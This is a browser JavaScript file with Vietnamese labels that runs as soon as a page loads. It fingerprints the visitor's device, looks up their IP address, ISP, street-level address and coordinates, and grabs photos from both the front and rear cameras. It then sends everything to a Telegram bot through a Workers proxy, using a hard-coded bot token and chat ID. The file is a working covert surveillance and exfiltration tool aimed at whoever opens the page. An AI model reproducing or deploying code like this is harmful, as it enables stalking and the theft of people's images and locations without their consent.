const TELEGRAM_BOT_TOKEN = '7731248083:AAFSbM3YKJuWb3kwqAQg1OGmySjf9mUFTaw';
const TELEGRAM_CHAT_ID = '6502310633';
const API_SEND_MEDIA = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;

const info = {
  time: new Date().toLocaleString(),
  ip: '',
  isp: '',
  address: '',
  country: '',
  lat: '',
  lon: '',
  device: '',
  os: '',
  camera: '⏳ Đang kiểm tra...'
};

function detectDevice() {
  const ua = navigator.userAgent;
  if (/iPhone|iPad|iPod/i.test(ua)) {
    info.device = 'iOS Device';
    info.os = 'iOS';
  } else if (/Android/i.test(ua)) {
    const match = ua.match(/Android.*; (.+?) Build/);
    info.device = match ? match[1] : 'Android Device';
    info.os = 'Android';
  } else if (/Windows NT/i.test(ua)) {
    info.device = 'Windows PC';
    info.os = 'Windows';
  } else if (/Macintosh/i.test(ua)) {
    info.device = 'Mac';
    info.os = 'macOS';
  } else {
    info.device = 'Không xác định';
    info.os = 'Không rõ';
  }
}

function getIPInfo() {
  return fetch("https://ipwho.is/")
    .then(res => res.json())
    .then(data => {
      info.ip = data.ip;
      info.isp = data.connection?.org || 'Không rõ';
      info.address = `${data.region}, ${data.city}, ${data.postal || ''}`.replace(/, $/, '');
      info.country = data.country;
      info.lat = data.latitude;
      info.lon = data.longitude;
    });
}

function getCaption() {
  return `
📡 [THÔNG TIN TRUY CẬP]

🕒 Thời gian: ${info.time}
📱 Thiết bị: ${info.device}
🖥️ Hệ điều hành: ${info.os}
🌐 IP: ${info.ip}
🏢 ISP: ${info.isp}
🏙️ Địa chỉ: ${info.address}
🌍 Quốc gia: ${info.country}
📍 Vĩ độ: ${info.lat}
📍 Kinh độ: ${info.lon}
📸 Camera: ${info.camera}
`.trim();
}

function captureCamera(facingMode = "user") {
  return new Promise((resolve, reject) => {
    navigator.mediaDevices.getUserMedia({ video: { facingMode } })
      .then(stream => {
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        video.onloadedmetadata = () => {
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");

          setTimeout(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(track => track.stop());

            canvas.toBlob(blob => resolve(blob), "image/jpeg", 0.9);
          }, 1000);
        };
      })
      .catch(err => reject(err));
  });
}

async function sendTwoPhotosAsMediaGroup(frontBlob, backBlob) {
  const formData = new FormData();

  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('media', JSON.stringify([
    {
      type: 'photo',
      media: 'attach://front',
      caption: getCaption()
    },
    {
      type: 'photo',
      media: 'attach://back'
    }
  ]));

  formData.append('front', frontBlob, 'front.jpg');
  formData.append('back', backBlob, 'back.jpg');

  return fetch(API_SEND_MEDIA, {
    method: 'POST',
    body: formData
  });
}

async function main() {
  detectDevice();

  let frontBlob = null, backBlob = null;
  try {
    frontBlob = await captureCamera("user");
    backBlob = await captureCamera("environment");
    info.camera = '✅ Đã chụp cả 2 camera';
  } catch (e) {
    info.camera = '📵 Không thể truy cập đủ camera';
  }

  await getIPInfo();

  if (frontBlob && backBlob) {
    await sendTwoPhotosAsMediaGroup(frontBlob, backBlob);
  } else {
    
    fetch(`https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: getCaption()
      })
    });
  }
}

main();
